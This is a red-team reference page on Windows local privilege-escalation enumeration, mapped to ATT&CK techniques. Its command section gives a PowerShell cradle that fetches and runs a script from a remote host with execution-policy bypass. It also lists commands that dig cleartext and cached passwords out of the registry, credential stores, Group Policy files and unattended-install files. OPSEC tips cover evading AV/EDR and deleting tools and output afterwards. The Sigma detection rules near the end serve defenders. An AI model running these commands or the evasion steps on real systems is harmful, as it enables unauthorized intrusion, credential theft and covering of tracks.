# Enumeration & Privilege Triage

ATT&CK: T1082 (System Information Discovery), T1518 (Software Discovery), T1134.001 (Token
Impersonation/Theft), T1057 (Process Discovery). CWE-1188 (Insecure Default Initialization),
CWE-269 (Improper Privilege Management).

## Theory / Mechanism

Windows local privesc is ~80% misconfiguration hunting. The single most important input is the
**current token**: privileges (`whoami /priv`), group membership/integrity level, and account type.
That tuple selects the entire downstream strategy — there is no point fuzzing services when you
already hold `SeImpersonatePrivilege`, and no point trying a Potato when you only hold `SeBackup`.

### Decision tree (apply first, before any tool)

```
whoami /priv  +  whoami /groups  +  integrity level
│
├─ Holds SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
│     → Potato family → SYSTEM            (token-impersonation-potatoes.md)
│     (token stripped? FullPowers to recover, then Potato)
│
├─ Holds SeBackup / SeRestore / SeTakeOwnership / SeLoadDriver / SeDebug / SeManageVolume
│     → privileged token-right abuse       (kernel-byovd.md)
│
├─ Standard user, member of local Administrators, Medium integrity, UAC on
│     → UAC bypass → High integrity        (uac-bypass.md)
│
├─ Already High integrity / local admin
│     → BYOVD to kernel/PPL + credential harvest (kernel-byovd.md, credential-harvesting.md)
│
└─ Plain low-priv user, none of the above
      → service / DLL / scheduled-task / registry misconfig hunt (service-dll-hijacking.md)
      → unpatched kernel EoP CVE (kernel-byovd.md)
```

### Token privilege classification

| Privilege | Why it matters | Path |
|-----------|----------------|------|
| SeImpersonatePrivilege | Impersonate a token from a coerced privileged service | Potato → SYSTEM |
| SeAssignPrimaryTokenPrivilege | Assign primary token to a new process | Potato / token swap |
| SeDebugPrivilege | Open any process incl. LSASS, inject, dump | LSASS dump, token theft |
| SeBackupPrivilege | Read any file ignoring DACL (FILE_FLAG_BACKUP_SEMANTICS) | Read SAM/SYSTEM, NTDS.dit |
| SeRestorePrivilege | Write any file/registry ignoring DACL | Overwrite protected binary/DLL, service hijack |
| SeTakeOwnershipPrivilege | Take ownership of any securable object | Own HKLM key/binary → modify |
| SeLoadDriverPrivilege | Load a kernel driver (legacy gate, weak post-admin) | BYOVD |
| SeManageVolumePrivilege | Full volume access → raw disk read / arbitrary write | Read raw NTFS, plant DLL |
| SeTcbPrivilege | Act as part of the OS | Token forging |

## Modern 2024-2026 currency (verified)

- **Stripped-token service accounts.** Local Service / Network Service shells frequently show a
  *filtered* token missing `SeImpersonatePrivilege`. `FullPowers` (itm4n) re-acquires the account's
  default privilege set by spawning a child as the account with full powers — then run a Potato.
- **AV reality.** `winPEAS.exe` (x64) is flagged by virtually all AV/EDR. Prefer `PrivescCheck.ps1`
  (itm4n, in-memory, no disk binary), the obfuscated winPEAS `.bat`, or build `Seatbelt` yourself —
  do not trust prebuilt offensive binaries downloaded from random repos.
- **Win11 24H2 hardening.** `NtQuerySystemInformation` info classes used to leak kernel addresses
  now require `SeDebugPrivilege` on 24H2 — this broke the CLFS CVE-2025-29824 exploit path on 24H2
  (see kernel-byovd.md), and changes what local kernel-EoP exploits will work by build.
- Tools: `PrivescCheck` (Invoke-PrivescCheck), `Seatbelt` (-group=all), `SharpUp audit`,
  `winPEAS` (.bat/.exe), `PowerUp` (Invoke-AllChecks), `FullPowers`, `accesschk.exe`.

## Complete working commands

### Identity & token
```powershell
whoami /all                     # SID, groups, integrity, privileges in one shot
whoami /priv                    # privilege list — the most important output
[Security.Principal.WindowsIdentity]::GetCurrent().Groups   # group SIDs
whoami /groups | findstr /i "Mandatory Label"               # integrity level
net localgroup administrators                               # local admins
```

### Automated enumeration (choose by AV posture)
```powershell
# PrivescCheck — in-memory, lowest footprint, best default choice
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Report pc_$env:COMPUTERNAME -Format TXT,CSV,HTML"

# Seatbelt — build from source; run specific groups to reduce noise
.\Seatbelt.exe -group=system -outputfile=C:\Windows\Tasks\sb.txt
.\Seatbelt.exe TokenPrivileges TokenGroups UAC LSASettings WindowsCredentialFiles

# winPEAS — prefer .bat (less flagged); fast mode skips slow searches
.\winPEASany_ofs.bat
.\winPEASx64.exe quiet fast      # if you must run the exe

# SharpUp / PowerUp
.\SharpUp.exe audit
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

### Manual high-value checks (no tool needed)
```powershell
# Autologon credentials in cleartext
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

# Stored credentials
cmdkey /list
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

# GPP cached passwords (cpassword — AES key is public)
findstr /S /I cpassword %SYSTEMDRIVE%\ProgramData\Microsoft\Group*Policy\*.xml 2>nul
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml 2>nul

# Unattended install / WiFi / app config secrets
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\System32\Sysprep\Unattend.xml 2>nul
dir /s /b C:\ProgramData\*.config C:\inetpub\*web.config 2>nul

# Scheduled tasks running as SYSTEM/admin — inspect XML for writable binaries
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
dir /s /b C:\Windows\System32\Tasks\

# AlwaysInstallElevated (both keys = 1 → trivial SYSTEM via MSI)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Patch level (to map against local kernel EoP CVEs)
wmic qfe get HotFixID,InstalledOn | sort
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

`scripts/win_privesc_triage.ps1` automates the decision tree above: it reads token privileges,
groups, integrity, classifies the privilege set, and prints the recommended next reference + tool.

## Detection

```yaml
title: Windows Privesc Enumeration Tool Execution
logsource: { product: windows, category: process_creation }
detection:
  names:
    Image|endswith: ['\winPEASx64.exe','\winPEASany.exe','\Seatbelt.exe','\SharpUp.exe','\PrivescCheck.ps1']
  bat:
    Image|endswith: ['\cmd.exe','\powershell.exe']
    CommandLine|contains: ['winPEAS','Invoke-PrivescCheck','Invoke-AllChecks','accesschk']
  condition: names or bat
level: medium
---
title: Mass Registry Credential Search (reg query /f password /s)
logsource: { product: windows, category: process_creation }
detection:
  sel:
    Image|endswith: '\reg.exe'
    CommandLine|contains|all: ['/f', 'password', '/s']
  condition: sel
level: high
```
IOCs: known hacktool hashes (winPEAS/Seatbelt/SharpUp); bursts of `reg query`/`accesschk`/`sc query`
from one user; recursive `findstr cpassword`; reads of `Unattend.xml`/`Winlogon\DefaultPassword`.

## OPSEC

- The triage itself is loud if you run signed-and-flagged binaries. Prefer in-memory PowerShell
  (`PrivescCheck`) or obfuscated `.bat`. Stage on disk only under a plausible path (`C:\Windows\Tasks`).
- Don't run every tool — they overlap heavily and multiply EDR hits. One enumerator + targeted manual
  checks is quieter. Read the token first; it usually collapses the search space immediately.
- `reg query ... /f password /s` is a high-fidelity alert — scope it to specific hives, not all of HKLM.
- Remove output files (`pc_*.html`, `sb.txt`) and any uploaded tooling on exit.

## References
- itm4n — PrivescCheck and FullPowers (github.com/itm4n)
- carlospolop — PEASS-ng / winPEAS; GhostPack — Seatbelt, SharpUp, PowerUp
- swisskyrepo — InternalAllTheThings / PayloadsAllTheThings, Windows Privilege Escalation (2025)
- Microsoft Security Blog — Win11 24H2 NtQuerySystemInformation hardening (Apr 2025)
